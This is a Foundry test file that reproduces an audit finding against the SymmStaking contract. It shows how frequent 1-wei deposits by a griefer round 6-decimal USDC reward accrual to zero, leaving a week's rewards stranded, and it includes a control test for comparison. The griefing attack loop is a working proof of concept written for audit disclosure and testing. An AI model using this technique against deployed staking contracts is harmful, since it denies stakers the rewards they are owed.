// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/symm/contracts/staking/SymmStaking.sol";

/// @dev Minimal real ERC20. SymmStaking treats SYMM/USDC as opaque tokens, so a
/// standards-compliant ERC20 is faithful here — only `decimals` differs.
contract SymmMockToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { uint256 a = allowance[from][msg.sender]; if (a != type(uint256).max) allowance[from][msg.sender] = a - amount; balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true; }
}

/// Reproduces Symmio Sherlock #575 / AuditVault #55104 against the REAL, unmodified
/// `SymmStaking` audited source. The bug: `rewardPerToken` accrues
/// `(elapsed * rate * 1e18) / totalSupply` with NO up-scaling for reward tokens
/// with < 18 decimals. For 6-decimal USDC the per-update increment truncates to
/// zero whenever a state update fires before ~500s of accrual — so an attacker who
/// keeps `_updateRewardsStates` firing (deposit/withdraw/claim/notify) permanently
/// strands the whole USDC reward while `lastUpdated` keeps advancing.
contract PoC_55104 is Test {
    SymmMockToken internal symm;
    SymmMockToken internal usdc;

    address internal victim = address(0xA11CE);
    address internal griefer = address(0xB0B);

    uint256 internal constant STAKE = 1_000_000 ether;   // 1,000,000 SYMM staked
    uint256 internal constant REWARD = 1_209_600_000;    // 1,209.6 USDC (6dp) over one week
    uint256 internal constant WEEK = 7 days;             // == DEFAULT_REWARDS_DURATION

    function _freshStaking() internal returns (SymmStaking staking) {
        symm = new SymmMockToken("SYMM", "SYMM", 18);
        usdc = new SymmMockToken("USD Coin", "USDC", 6);
        staking = new SymmStaking();
        staking.initialize(address(this), address(symm));
        staking.configureRewardToken(address(usdc), true);

        symm.mint(victim, STAKE);
        symm.mint(griefer, 1 ether);
        vm.prank(victim); symm.approve(address(staking), type(uint256).max);
        vm.prank(griefer); symm.approve(address(staking), type(uint256).max);
        vm.prank(victim); staking.deposit(STAKE, victim);

        usdc.mint(address(this), REWARD);
        usdc.approve(address(staking), type(uint256).max);
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(usdc);
        amounts[0] = REWARD;
        staking.notifyRewardAmount(tokens, amounts);

        // rate == REWARD / WEEK == 2000 usdc-wei/sec (this alone is NOT truncated).
        (, , uint256 rate, , ) = staking.rewardState(address(usdc));
        assertEq(rate, 2000, "rate should be 2000 usdc-wei/sec");
    }

    /// The attack: poke `_updateRewardsStates` every 249 blocks (498s). Each poke's
    /// per-token increment `(498 * 2000 * 1e18) / 1e24 == 0` truncates away while
    /// `lastUpdated` advances — so after a full week the victim earns ZERO.
    function testFrequentUpdatesRoundSixDecimalRewardsToZero() public {
        SymmStaking staking = _freshStaking();

        for (uint256 elapsed; elapsed < WEEK;) {
            uint256 step = WEEK - elapsed;
            if (step > 498) step = 498; // 249 blocks * 2s
            vm.warp(block.timestamp + step);
            vm.prank(griefer);
            staking.deposit(1 wei, griefer); // any deposit/withdraw/claim/notify works
            elapsed += step;
        }

        // A full week elapsed and 1,209.6 USDC was funded, yet nothing accrued.
        assertEq(staking.rewardPerToken(address(usdc)), 0, "perTokenStored never grew");
        assertEq(staking.earned(victim, address(usdc)), 0, "victim earned nothing");
        assertEq(staking.pendingRewards(address(usdc)), REWARD, "entire reward left pending");

        vm.prank(victim);
        staking.claimRewards();
        assertEq(usdc.balanceOf(victim), 0, "victim received 0 USDC after a full week");
        assertEq(usdc.balanceOf(address(staking)), REWARD, "all 1,209.6 USDC stranded in the contract");
    }

    /// Control: the SAME reward, SAME stake, SAME week — but the reward state is
    /// updated only ONCE (at the end). Now the rewards DO distribute (~1,209 USDC),
    /// proving the loss above is caused specifically by the FREQUENT-update griefing,
    /// not by the reward being absent or unfunded.
    function testInfrequentUpdateDistributesRewards() public {
        SymmStaking staking = _freshStaking();

        // No intermediate pokes; jump straight to period end, then update once.
        vm.warp(block.timestamp + WEEK);

        uint256 earned = staking.earned(victim, address(usdc));
        assertEq(earned, 1_209_000_000, "single-update accrual is ~1,209 USDC (vs 0 when griefed)");

        vm.prank(victim);
        staking.claimRewards();
        assertEq(usdc.balanceOf(victim), 1_209_000_000, "victim receives ~1,209 USDC when not griefed");
    }
}
